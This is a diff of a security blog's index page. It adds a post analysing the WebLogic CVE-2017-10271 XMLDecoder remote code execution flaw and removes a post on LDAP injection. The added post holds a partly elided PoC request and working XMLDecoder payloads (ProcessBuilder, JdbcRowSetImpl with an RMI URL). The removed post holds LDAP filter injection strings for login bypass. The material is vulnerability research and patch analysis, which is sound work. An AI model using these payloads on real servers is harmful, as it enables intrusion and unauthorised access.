@@ -331,6 +331,184 @@
   
 
   <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
+    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/12/22/Weblogic CVE-2017-10271 XMLDecoder RCE分析/">
+
+    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
+      <meta itemprop="name" content="廖新喜">
+      <meta itemprop="description" content="">
+      <meta itemprop="image" content="/images/avatar.png">
+    </span>
+
+    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
+      <meta itemprop="name" content="xxlegend">
+    </span>
+
+    
+      <header class="post-header">
+
+        
+        
+          <h1 class="post-title" itemprop="name headline">
+            
+            
+              
+                
+                <a class="post-title-link" href="/2017/12/22/Weblogic CVE-2017-10271 XMLDecoder RCE分析/" itemprop="url">
+                  Weblogic CVE-2017-10271 XMLDecoder RCE分析
+                </a>
+              
+            
+          </h1>
+        
+
+        <div class="post-meta">
+          <span class="post-time">
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-calendar-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">发表于</span>
+              
+              <time title="创建于" itemprop="dateCreated datePublished" datetime="2017-12-22T23:37:47+08:00">
+                2017-12-22
+              </time>
+            
+
+            
+
+            
+          </span>
+
+          
+            <span class="post-category" >
+            
+              <span class="post-meta-divider">|</span>
+            
+              <span class="post-meta-item-icon">
+                <i class="fa fa-folder-o"></i>
+              </span>
+              
+                <span class="post-meta-item-text">分类于</span>
+              
+              
+                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
+                  <a href="/categories/Java/" itemprop="url" rel="index">
+                    <span itemprop="name">Java</span>
+                  </a>
+                </span>
+
+                
+                
+              
+            </span>
+          
+
+          
+            
+              <span class="post-comments-count">
+                <span class="post-meta-divider">|</span>
+                <span class="post-meta-item-icon">
+                  <i class="fa fa-comment-o"></i>
+                </span>
+                <a href="/2017/12/22/Weblogic CVE-2017-10271 XMLDecoder RCE分析/#comments" itemprop="discussionUrl">
+                  <span class="post-comments-count disqus-comment-count"
+                        data-disqus-identifier="2017/12/22/Weblogic CVE-2017-10271 XMLDecoder RCE分析/" itemprop="commentCount"></span>
+                </a>
+              </span>
+            
+          
+
+          
+          
+             <span id="/2017/12/22/Weblogic CVE-2017-10271 XMLDecoder RCE分析/" class="leancloud_visitors" data-flag-title="Weblogic CVE-2017-10271 XMLDecoder RCE分析">
+               <span class="post-meta-divider">|</span>
+               <span class="post-meta-item-icon">
+                 <i class="fa fa-eye"></i>
+               </span>
+               
+                 <span class="post-meta-item-text">阅读次数 </span>
+               
+                 <span class="leancloud-visitors-count"></span>
+             </span>
+          
+
+          
+
+          
+
+          
+
+        </div>
+      </header>
+    
+
+    <div class="post-body" itemprop="articleBody">
+
+      
+      
+
+      
+        
+          
+            <p>挖矿确实太火，现在只要存在RCE漏洞就会有矿机的身影，这不weblogic又火了一把。这次矿机使用的PoC是wls wsat模块的RCE漏洞，这个漏洞的核心就是XMLDecoder的反序列化漏洞，关于XMLDecoder反序列化的漏洞在2013年就被广泛传播，这次的漏洞是由于官方修复不完善导致被绕过。</p>
+<h2 id="1-补丁分析"><a href="#1-补丁分析" class="headerlink" title="1 补丁分析"></a>1 补丁分析</h2><p>首先来看下weblogic的历史补丁，四月份补丁通告：<br><a href="http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html" target="_blank" rel="external">http://www.oracle.com/technetwork/security-advisory/cpuapr2017-3236618.html</a><br>这里面主要关注CVE-2017-3506，这是web service模块的漏洞。</p>
+<p>10月份补丁通告：<br><a href="https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html" target="_blank" rel="external">https://www.oracle.com/technetwork/topics/security/cpuoct2017-3236626.html</a><br>主要关注CVE-2017-10271，是WLS Security组建的漏洞，英文描述如下：<br>A remote user can exploit a flaw in the Oracle WebLogic Server WLS Security component to gain elevated privileges [CVE-2017-10271].这是CVE-2017-10271的描述信息。<br>测试的poc如下：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div></pre></td><td class="code"><pre><div class="line">POST /wls-wsat/CoordinatorPortType HTTP/1.1</div><div class="line">Host: 192.168.3.216:7001</div><div class="line">Accept-Encoding: identity</div><div class="line">Content-Length: 683</div><div class="line">Accept-Language: zh-CN,zh;q=0.8</div><div class="line">Accept: */*</div><div class="line">User-Agent: Mozilla/5.0 (Windows NT 5.1; rv:5.0) Gecko/20100101 Firefox/5.0</div><div class="line">Accept-Charset: GBK,utf-8;q=0.7,*;q=0.3</div><div class="line">Connection: keep-alive</div><div class="line">Cache-Control: max-age=0</div><div class="line">Content-Type: text/xml</div><div class="line"></div><div class="line">&lt;soapenv:Envelope xmlns:soapenv=&quot;http://schemas.xmlsoap.org/soap/envelope/&quot;&gt;</div><div class="line">  &lt;soapenv:Header&gt;</div><div class="line">    &lt;work:WorkContext xmlns:work=&quot;http://bea.com/2004/06/soap/workarea/&quot;&gt;</div><div class="line">        &lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">          &lt;void class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">            &lt;array class=&quot;java.lang.String&quot; length=&quot;3&quot;&gt;</div><div class="line">              。。。。</div><div class="line">          &lt;void method=&quot;start&quot;/&gt;&lt;/void&gt;</div><div class="line">        &lt;/java&gt;</div><div class="line">      &lt;/work:WorkContext&gt;</div><div class="line">    &lt;/soapenv:Header&gt;</div><div class="line">  &lt;soapenv:Body/&gt;</div><div class="line">&lt;/soapenv:Envelope&gt;</div></pre></td></tr></table></figure></p>
+<p>对于poc中uri中<code>/wls-wsat/CoordinatorPortType</code> 可以换成CoordinatorPortType11等wsat 这个webservice服务中存在的其他uri<br>执行的效果图如下：<br><img src="/images/2017-10271-0.png" alt="0"></p>
+<p>跟踪到底这还是XMLDecoder的漏洞，下面来分析补丁代码：首先来看3506的补丁的分析，在文件weblogic/wsee/workarea/WorkContextXmlInputAdapter.java中，<br>添加了validate方法，方法的实现如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</div><div class="line">      WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</div><div class="line"></div><div class="line">      <span class="keyword">try</span> &#123;</div><div class="line">         SAXParser parser = factory.newSAXParser();</div><div class="line">         parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</div><div class="line">            <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</div><div class="line">                  <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid context type: object"</span>);</div><div class="line">               &#125;</div><div class="line">            &#125;</div><div class="line">         &#125;);</div><div class="line">      &#125; <span class="keyword">catch</span> (ParserConfigurationException var5) &#123;</div><div class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var5);</div><div class="line">      &#125; <span class="keyword">catch</span> (SAXException var6) &#123;</div><div class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var6);</div><div class="line">      &#125; <span class="keyword">catch</span> (IOException var7) &#123;</div><div class="line">         <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Parser Exception"</span>, var7);</div><div class="line">      &#125;</div><div class="line">   &#125;</div></pre></td></tr></table></figure></p>
+<p>简单来说就是在解析xml的过程中，如果Element字段值为Object就抛出异常，这简直太脑残了，所以马上就有了CVE-2017-10271。我前段时间分析Oracle Weblogic十月份的补丁的时候看到WorkContextXmlInputAdapter 相关代码时只关注了这块dos的漏洞，没看到10271添加的对new，method，void的去除，还想当然的以为自己找到0day了呢。因为可以通过其他方式绕过，比如典型的就是将object改为void，这是挖矿的人采用的poc，我也想到了，当然也还可以通过new关键字来创建反序列化执行的poc，下面简单示例一下通过new关键字来执行命令：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.4.0"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></div><div class="line">    <span class="tag">&lt;<span class="name">new</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></div><div class="line">        <span class="tag">&lt;<span class="name">string</span>&gt;</span>calc<span class="tag">&lt;/<span class="name">string</span>&gt;</span><span class="tag">&lt;<span class="name">method</span> <span class="attr">name</span>=<span class="string">"start"</span> /&gt;</span></div><div class="line">    <span class="tag">&lt;/<span class="name">new</span>&gt;</span></div><div class="line"><span class="tag">&lt;/<span class="name">java</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>至于为什么XMLDecoder在解析的过程中能执行代码呢，大家可以以如下测试用例进行测试：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div></pre></td><td class="code"><pre><div class="line">&lt;java version=&quot;1.8.0_131&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">    &lt;void class=&quot;com.sun.rowset.JdbcRowSetImpl&quot;&gt;</div><div class="line">    &lt;void property=&quot;dataSourceName&quot;&gt;</div><div class="line">        &lt;string&gt;rmi://localhost:1099/Exploit&lt;/string&gt;</div><div class="line">    &lt;/void&gt;</div><div class="line">    &lt;void property=&quot;autoCommit&quot;&gt;</div><div class="line">        &lt;boolean&gt;true&lt;/boolean&gt;</div><div class="line">    &lt;/void&gt;</div><div class="line">    &lt;/void&gt;</div><div class="line">&lt;/java&gt;</div></pre></td></tr></table></figure></p>
+<p>是不是觉得变种太多，写法太灵活了，比XStream远程执行代码的要求还低。根据如上poc首先生成JdbcRowSetImpl的实例，接着调用该实例的set方法来初始化该实例的属性，当调用完setAutoCommit接口的时候就会根据dataSourceName的值去远程加载一个类初始化。</p>
+<p>针对上面的PoC，官方放出了10271的补丁，补丁如下：<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">private</span> <span class="keyword">void</span> <span class="title">validate</span><span class="params">(InputStream is)</span> </span>&#123;</div><div class="line">   WebLogicSAXParserFactory factory = <span class="keyword">new</span> WebLogicSAXParserFactory();</div><div class="line"></div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      SAXParser parser = factory.newSAXParser();</div><div class="line">      parser.parse(is, <span class="keyword">new</span> DefaultHandler() &#123;</div><div class="line">         <span class="keyword">private</span> <span class="keyword">int</span> overallarraylength = <span class="number">0</span>;</div><div class="line"></div><div class="line">         <span class="function"><span class="keyword">public</span> <span class="keyword">void</span> <span class="title">startElement</span><span class="params">(String uri, String localName, String qName, Attributes attributes)</span> <span class="keyword">throws</span> SAXException </span>&#123;</div><div class="line">            <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"object"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:object"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"new"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:new"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"method"</span>)) &#123;</div><div class="line">               <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid element qName:method"</span>);</div><div class="line">            &#125; <span class="keyword">else</span> &#123;</div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"void"</span>)) &#123;</div><div class="line">                  <span class="keyword">for</span>(<span class="keyword">int</span> attClass = <span class="number">0</span>; attClass &lt; attributes.getLength(); ++attClass) &#123;</div><div class="line">                     <span class="keyword">if</span>(!<span class="string">"index"</span>.equalsIgnoreCase(attributes.getQName(attClass))) &#123;</div><div class="line">                        <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"Invalid attribute for element void:"</span> + attributes.getQName(attClass));</div><div class="line">                     &#125;</div><div class="line">                  &#125;</div><div class="line">               &#125;</div><div class="line"></div><div class="line">               <span class="keyword">if</span>(qName.equalsIgnoreCase(<span class="string">"array"</span>)) &#123;</div><div class="line">                  String var9 = attributes.getValue(<span class="string">"class"</span>);</div><div class="line">                  <span class="keyword">if</span>(var9 != <span class="keyword">null</span> &amp;&amp; !var9.equalsIgnoreCase(<span class="string">"byte"</span>)) &#123;</div><div class="line">                     <span class="keyword">throw</span> <span class="keyword">new</span> IllegalStateException(<span class="string">"The value of class attribute is not valid for array element."</span>);</div><div class="line">                  &#125;</div></pre></td></tr></table></figure></p>
+<p>这个补丁限定了object，new,method,void，array等字段，就限定了不能生成java 实例。如下的测试用例就不可执行：<br><figure class="highlight plain"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div></pre></td><td class="code"><pre><div class="line">&lt;java version=&quot;1.4.0&quot; class=&quot;java.beans.XMLDecoder&quot;&gt;</div><div class="line">    &lt;new class=&quot;java.lang.ProcessBuilder&quot;&gt;</div><div class="line">        &lt;string&gt;calc&lt;/string&gt;&lt;method name=&quot;start&quot; /&gt;</div><div class="line">    &lt;/new&gt;</div><div class="line">&lt;/java&gt;</div></pre></td></tr></table></figure></p>
+<h2 id="2-动态调试"><a href="#2-动态调试" class="headerlink" title="2 动态调试"></a>2 动态调试</h2><p>为了更好的理解这个漏洞，我们通过本地的weblogic动态调试一番，PoC还是前面提到的，具体的调用栈如下：<br><img src="/images/2017-10271-1.png" alt="1"><br><img src="/images/2017-10271-2.png" alt="2"><br><img src="/images/2017-10271-3.png" alt="3"></p>
+<p>调用栈非常深，我们简单解释一下关键的几个部位，首先是WorkContextServerTube.java中processRequest方法，主要功能就是分割整个xml，抽取真正执行的xml交给readHeadOld方法。<br><figure class="highlight java"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div><div class="line">7</div><div class="line">8</div><div class="line">9</div><div class="line">10</div><div class="line">11</div><div class="line">12</div><div class="line">13</div><div class="line">14</div><div class="line">15</div><div class="line">16</div><div class="line">17</div><div class="line">18</div><div class="line">19</div><div class="line">20</div><div class="line">21</div><div class="line">22</div><div class="line">23</div><div class="line">24</div><div class="line">25</div><div class="line">26</div><div class="line">27</div><div class="line">28</div><div class="line">29</div><div class="line">30</div><div class="line">31</div><div class="line">32</div><div class="line">33</div><div class="line">34</div><div class="line">35</div></pre></td><td class="code"><pre><div class="line"><span class="function"><span class="keyword">public</span> NextAction <span class="title">processRequest</span><span class="params">(Packet var1)</span> </span>&#123;</div><div class="line">   <span class="keyword">this</span>.isUseOldFormat = <span class="keyword">false</span>;</div><div class="line">   <span class="keyword">if</span>(var1.getMessage() != <span class="keyword">null</span>) &#123;</div><div class="line">      HeaderList var2 = var1.getMessage().getHeaders();</div><div class="line">      Header var3 = var2.get(WorkAreaConstants.WORK_AREA_HEADER, <span class="keyword">true</span>);</div><div class="line">      <span class="keyword">if</span>(var3 != <span class="keyword">null</span>) &#123;</div><div class="line">         <span class="keyword">this</span>.readHeaderOld(var3);</div><div class="line">         <span class="keyword">this</span>.isUseOldFormat = <span class="keyword">true</span>;</div><div class="line">      &#125;</div><div class="line"></div><div class="line">      Header var4 = var2.get(<span class="keyword">this</span>.JAX_WS_WORK_AREA_HEADER, <span class="keyword">true</span>);</div><div class="line">      <span class="keyword">if</span>(var4 != <span class="keyword">null</span>) &#123;</div><div class="line">         <span class="keyword">this</span>.readHeader(var4);</div><div class="line">      &#125;</div><div class="line">   &#125;</div><div class="line"></div><div class="line"></div><div class="line"><span class="function"><span class="keyword">protected</span> <span class="keyword">void</span> <span class="title">readHeaderOld</span><span class="params">(Header var1)</span> </span>&#123;</div><div class="line">   <span class="keyword">try</span> &#123;</div><div class="line">      XMLStreamReader var2 = var1.readHeader();</div><div class="line">      var2.nextTag();</div><div class="line">      var2.nextTag();</div><div class="line">      XMLStreamReaderToXMLStreamWriter var3 = <span class="keyword">new</span> XMLStreamReaderToXMLStreamWriter();</div><div class="line">      ByteArrayOutputStream var4 = <span class="keyword">new</span> ByteArrayOutputStream();</div><div class="line">      XMLStreamWriter var5 = XMLStreamWriterFactory.create(var4);</div><div class="line">      var3.bridge(var2, var5);</div><div class="line">      var5.close();</div><div class="line">      WorkContextXmlInputAdapter var6 = <span class="keyword">new</span> WorkContextXmlInputAdapter(<span class="keyword">new</span> ByteArrayInputStream(var4.toByteArray()));</div><div class="line">      <span class="keyword">this</span>.receive(var6);</div><div class="line">   &#125; <span class="keyword">catch</span> (XMLStreamException var7) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var7);</div><div class="line">   &#125; <span class="keyword">catch</span> (IOException var8) &#123;</div><div class="line">      <span class="keyword">throw</span> <span class="keyword">new</span> WebServiceException(var8);</div><div class="line">   &#125;</div><div class="line">&#125;</div></pre></td></tr></table></figure></p>
+<p>在上述代码中ByteArrayOutputStream var4会被填充为PoC实际执行部分代码即：<br><figure class="highlight xml"><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"><span class="tag">&lt;<span class="name">java</span> <span class="attr">version</span>=<span class="string">"1.8.0_131"</span> <span class="attr">class</span>=<span class="string">"java.beans.XMLDecoder"</span>&gt;</span></div><div class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">class</span>=<span class="string">"java.lang.ProcessBuilder"</span>&gt;</span></div><div class="line">            <span class="tag">&lt;<span class="name">array</span> <span class="attr">class</span>=<span class="string">"java.lang.String"</span> <span class="attr">length</span>=<span class="string">"3"</span>&gt;</span></div><div class="line">             。。。</div><div class="line">          <span class="tag">&lt;<span class="name">void</span> <span class="attr">method</span>=<span class="string">"start"</span>/&gt;</span><span class="tag">&lt;/<span class="name">void</span>&gt;</span></div><div class="line">        <span class="tag">&lt;/<span class="name">java</span>&gt;</span></div></pre></td></tr></table></figure></p>
+<p>接着这部分xml会被传递到XMLDecoder的readObject方法中从而导致反序列化远程代码执行。</p>
+<p>总之，尽快打上Weblogic 10月份的补丁，另外预告一下，我给Weblogic提交的RCE官方已经bug号。</p>
+
+          
+        
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <div>
+      
+    </div>
+
+    <footer class="post-footer">
+      
+
+      
+
+      
+
+      
+      
+        <div class="post-eof"></div>
+      
+    </footer>
+  </article>
+
+
+    
+      
+
+  
+
+  
+  
+  
+
+  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
     <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2017/12/06/S2-055漏洞环境搭建与分析/">
 
     <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
@@ -1952,193 +2130,6 @@
 
 
     
-      
-
-  
-
-  
-  
-  
-
-  <article class="post post-type-normal " itemscope itemtype="http://schema.org/Article">
-    <link itemprop="mainEntityOfPage" href="http://xxlegend.com/2016/12/01/Python安全编码之预防LDAP注入/">
-
-    <span hidden itemprop="author" itemscope itemtype="http://schema.org/Person">
-      <meta itemprop="name" content="廖新喜">
-      <meta itemprop="description" content="">
-      <meta itemprop="image" content="/images/avatar.png">
-    </span>
-
-    <span hidden itemprop="publisher" itemscope itemtype="http://schema.org/Organization">
-      <meta itemprop="name" content="xxlegend">
-    </span>
-
-    
-      <header class="post-header">
-
-        
-        
-          <h1 class="post-title" itemprop="name headline">
-            
-            
-              
-                
-                <a class="post-title-link" href="/2016/12/01/Python安全编码之预防LDAP注入/" itemprop="url">
-                  Python安全编码之预防LDAP注入
-                </a>
-              
-            
-          </h1>
-        
-
-        <div class="post-meta">
-          <span class="post-time">
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-calendar-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">发表于</span>
-              
-              <time title="创建于" itemprop="dateCreated datePublished" datetime="2016-12-01T15:38:36+08:00">
-                2016-12-01
-              </time>
-            
-
-            
-
-            
-          </span>
-
-          
-            <span class="post-category" >
-            
-              <span class="post-meta-divider">|</span>
-            
-              <span class="post-meta-item-icon">
-                <i class="fa fa-folder-o"></i>
-              </span>
-              
-                <span class="post-meta-item-text">分类于</span>
-              
-              
-                <span itemprop="about" itemscope itemtype="http://schema.org/Thing">
-                  <a href="/categories/Python/" itemprop="url" rel="index">
-                    <span itemprop="name">Python</span>
-                  </a>
-                </span>
-
-                
-                
-              
-            </span>
-          
-
-          
-            
-              <span class="post-comments-count">
-                <span class="post-meta-divider">|</span>
-                <span class="post-meta-item-icon">
-                  <i class="fa fa-comment-o"></i>
-                </span>
-                <a href="/2016/12/01/Python安全编码之预防LDAP注入/#comments" itemprop="discussionUrl">
-                  <span class="post-comments-count disqus-comment-count"
-                        data-disqus-identifier="2016/12/01/Python安全编码之预防LDAP注入/" itemprop="commentCount"></span>
-                </a>
-              </span>
-            
-          
-
-          
-          
-             <span id="/2016/12/01/Python安全编码之预防LDAP注入/" class="leancloud_visitors" data-flag-title="Python安全编码之预防LDAP注入">
-               <span class="post-meta-divider">|</span>
-               <span class="post-meta-item-icon">
-                 <i class="fa fa-eye"></i>
-               </span>
-               
-                 <span class="post-meta-item-text">阅读次数 </span>
-               
-                 <span class="leancloud-visitors-count"></span>
-             </span>
-          
-
-          
-
-          
-
-          
-
-        </div>
-      </header>
-    
-
-    <div class="post-body" itemprop="articleBody">
-
-      
-      
-
-      
-        
-          
-            <h2 id="1-LDAP简介"><a href="#1-LDAP简介" class="headerlink" title="1 LDAP简介"></a>1 LDAP简介</h2><p>LDAP（Lightweight Directory Access Protocol）轻量级目录协议，是一种在线目录访问协议，主要用于资源查询，是X.500的一种简便的实现。它是一种树结构，查询效率很高，插入效率稍低。目录和数据库有很多相似之处，都用于存放数据，可以查询插入，目录可以存放各种数据，而数据库的数据则有比较严格的约束条件。<br>LDAP目录以入口(entry，目录中存储的基本信息单元)的形式存储和组织数据结构，每个入口有一个唯一标示自己的专属名称(distnguished name)，DN由系列RDNs(ralative distinguished names)组成。另外还有两个常见的结构，对象类和属性。对象类(object class)会定义独一的OID，每个属性(attribute)也会分配唯一的OID号码。</p>
-<h2 id="2-LDAP注入原理"><a href="#2-LDAP注入原理" class="headerlink" title="2 LDAP注入原理"></a>2 LDAP注入原理</h2><p>谈起LDAP注入首先得从LDAP的查询语法开始，基本的查询语法如下：<br>search语法：attribute operator value</p>
-<p>　　 <code>search filter options:( &quot;&amp;&quot; or &quot;|&quot; (filter1) (filter2) (filter3) ...) (&quot;!&quot; (filter))</code></p>
-<p> 　主要根据属性和值进行搜索，就如浏览网页时我们通常并不会浏览某个目录，而是其下存在的某个文件。<br> 　　LDAP的URL形式为：<code>ldap://&lt;host&gt;:&lt;port&gt;/&lt;path&gt;，&lt;path&gt;:&lt;dn&gt;[?&lt;artribute&gt;[?&lt;scope&gt;?&lt;filter&gt;]]</code><br>　　 例如： <code>ldap://austin.ibm.com/ou=Austin,o=IBM</code> </p>
-<h3 id="2-1-注入过程"><a href="#2-1-注入过程" class="headerlink" title="2.1 注入过程"></a>2.1 注入过程</h3><p>从注入原理来看，ldap注入分为and注入和or注入，先看and注入情形，假设查询结构如下<code>(&amp;(user=username)(passwd=password))</code>,这可能是采用采用LDAP进行登录验证的查询语句，其中username和password都是用户可控制的参数，那么可以在user处注入<code>admin*)(objectClass=*)</code>形成如下<br><code>(&amp;(user=admin*)(objectClass=*))(passwd=password))</code> 有点小语法错误，如果在user处注入<code>admin*)(objectClass=*))(&amp;(objectClass=*</code><br><code>(&amp;(user=admin*)(objectClass=*))(|(objectClass=void)(passwd=passwd))</code> 无语法错误,对于openldap来说，只会执行第一个&amp;括号内的内容，由于objectClass=*恒为真，我们就能无需密码以admin用户的身份登录系统<br>如果不允许两个过滤服务器的执行，则是<br><code>(&amp;(user=username)(injected_filter)(passwd=password))</code></p>
-<p>对于or注入，查询表达式如下：<br><code>(|(user=username)(email=email_addr))</code><br>假如username可控，即可注入<br><code>username*)(objectClass=void))(|objectClass=void</code><br>形成<br><code>(|(user=username)(objectClass=void))(|objectClass=void)(email=email_addr))</code>,由于objectClass=void恒为假，所以只有user=username的时候整个值为真。</p>
-<h3 id="2-2-渗透技巧"><a href="#2-2-渗透技巧" class="headerlink" title="2.2 渗透技巧"></a>2.2 渗透技巧</h3><p>对于渗透测试来说，还是要看报错，比如输入<code>\</code>,如果关闭了报错接口，可以通过正确参数后加”<em>“字符，如果返回一致，必有蹊跷，很有可能就是一个注入点，接着就可以尝试盲注的方式，简单的盲注就是”</em>a*”这种方式。</p>
-<h3 id="2-3-调试与验证"><a href="#2-3-调试与验证" class="headerlink" title="2.3 调试与验证"></a>2.3 调试与验证</h3><p>在代码审计过程中，有些时候代码结构庞大，为了验证是否存在注入点，不好直接改写在python命令行中执行，那么就可以尝试打开ldap的日志，这样直接从url参数中加入注入元素，就能很好的观察注入的效果。下面是打开ldap日志的方法。一般的文章中都是打开syslogd，如果已经替换成了rsyslogd，也不要惊慌。rsyslogd是syslogd的升级包，原来的配置文件都还可用，增加了很多新功能，如能监听端口或者IP。下面就是打开LDAP日志的步骤：</p>
-<p>1.在slapd.conf中加一行：</p>
-<figure class="highlight plain"><figcaption><span>4095 ```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">2.在/etc/rsyslog.conf 中加入ldap日志文档：</div><div class="line"></div><div class="line">```local4.* /var/log/ldap.log</div></pre></td></tr></table></figure>
-<p>3.在终端用命令重启syslog服务</p>
-<figure class="highlight plain"><figcaption><span>service rsyslog restart```</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div><div class="line">4</div><div class="line">5</div><div class="line">6</div></pre></td><td class="code"><pre><div class="line"></div><div class="line">4.在/var/log/下可以找到一个ldap.log文件</div><div class="line">随着时间增长，这个日志会增长较快，注意删除。</div><div class="line">有时候为了查看实际的搜索结果，可以下载ldap的相关工具，在windows下推荐使用LDAP Administrator，linux下可以使用ldapsearch工具，ldapsearch具体用法如下：</div><div class="line"></div><div class="line">```ldapsearch -h 10.5.5.5 -p 389 -D &apos;o=customer&apos; -W -x -b &quot;o=customer&quot; &quot;cn=645*&quot;</div></pre></td></tr></table></figure>
-<figure class="highlight plain"><figcaption><span>binddn  bind DN</span></figcaption><table><tr><td class="gutter"><pre><div class="line">1</div><div class="line">2</div><div class="line">3</div></pre></td><td class="code"><pre><div class="line">-W         prompt for bind password</div><div class="line">-x         Simple authentication</div><div class="line">-b basedn  base dn for search</div></pre></td></tr></table></figure>
-<h2 id="3-python-安全编码"><a href="#3-python-安全编码" class="headerlink" title="3 python 安全编码"></a>3 python 安全编码</h2><p>如何在python中防止LDAP注入呢？首先我们来看下简单的ldap连接，绑定再到查询的示例，这个查询是存在注入风险的，请不要模仿，请不要模仿，请不要模仿。</p>
